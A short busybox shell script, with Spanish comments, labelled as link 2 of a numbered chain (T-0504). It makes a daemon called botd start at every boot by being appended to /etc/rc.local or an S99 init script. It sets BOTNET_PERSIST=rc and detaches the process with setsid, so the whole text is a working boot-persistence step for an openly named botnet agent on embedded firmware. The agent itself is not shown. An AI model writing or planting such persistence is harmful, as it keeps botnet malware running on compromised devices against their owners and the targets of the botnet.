#!/bin/sh
# T-0504 eslabon 2: firmware sin systemd (busybox). Anadir al final de
# /etc/rc.local (o /etc/rc.d/S99botd). BOTNET_PERSIST=rc hace que botd
# loguee persist=rc; setsid suelta el proceso del script de arranque.
[ -x /data/botd/botd ] || exit 0
BOTNET_PERSIST=rc setsid /data/botd/botd --parent --config /data/botd/config.json >/data/botd/botd.log 2>&1 &
exit 0
